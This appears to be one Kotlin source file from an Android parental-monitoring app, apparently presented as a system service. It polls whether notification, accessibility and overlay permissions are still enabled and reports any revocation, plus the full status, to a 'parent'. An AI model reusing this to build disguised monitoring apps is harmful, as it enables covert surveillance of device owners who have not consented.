package com.system.service.monitors

import android.content.ComponentName
import android.content.Context
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import com.system.service.core.CoreService
import org.json.JSONObject

/**
 * Periodically checks if critical permissions are still enabled.
 * If a permission is revoked after being granted, alerts the parent.
 */
object PermissionWatcher {

    private const val CHECK_INTERVAL_MS = 5 * 60 * 1000L   // every 5 minutes

    private var handler: Handler? = null
    private var appContext: Context? = null
    private val lastStates = mutableMapOf<String, Boolean>()
    private var started = false

    private val checkRunnable = object : Runnable {
        override fun run() {
            check()
            handler?.postDelayed(this, CHECK_INTERVAL_MS)
        }
    }

    fun start(context: Context) {
        if (started) return
        started = true
        appContext = context.applicationContext
        handler = Handler(Looper.getMainLooper())
        // First run after 30s to let the app settle
        handler?.postDelayed(checkRunnable, 30_000L)
    }

    fun stop() {
        handler?.removeCallbacks(checkRunnable)
        handler = null
        started = false
    }

    private fun check() {
        val ctx = appContext ?: return
        val svc = CoreService.instance ?: return

        val current = mapOf(
            "notification_access" to isNotificationEnabled(ctx),
            "accessibility"       to isAccessibilityEnabled(ctx),
            "overlay"             to Settings.canDrawOverlays(ctx)
        )

        for ((name, granted) in current) {
            val prev = lastStates[name]
            if (prev == true && !granted) {
                // Was enabled, now disabled — alert parent!
                svc.sendData("permission_revoked", JSONObject().apply {
                    put("permission", name)
                    put("time", System.currentTimeMillis())
                })
            }
            lastStates[name] = granted
        }

        // Also send full permission status every check
        svc.sendData("permission_status", JSONObject().apply {
            current.forEach { (k, v) -> put(k, v) }
            put("time", System.currentTimeMillis())
        })
    }

    private fun isNotificationEnabled(ctx: Context): Boolean {
        val cn   = ComponentName(ctx, NotificationMonitor::class.java)
        val flat = Settings.Secure.getString(ctx.contentResolver, "enabled_notification_listeners")
        return flat?.contains(cn.flattenToString()) == true
    }

    private fun isAccessibilityEnabled(ctx: Context): Boolean {
        val cn   = ComponentName(ctx.packageName, "com.system.service.monitors.AccessibilityMonitor")
        val flat = cn.flattenToString()
        return try {
            val enabled = Settings.Secure.getString(
                ctx.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
            enabled.contains(flat)
        } catch (_: Exception) { false }
    }
}
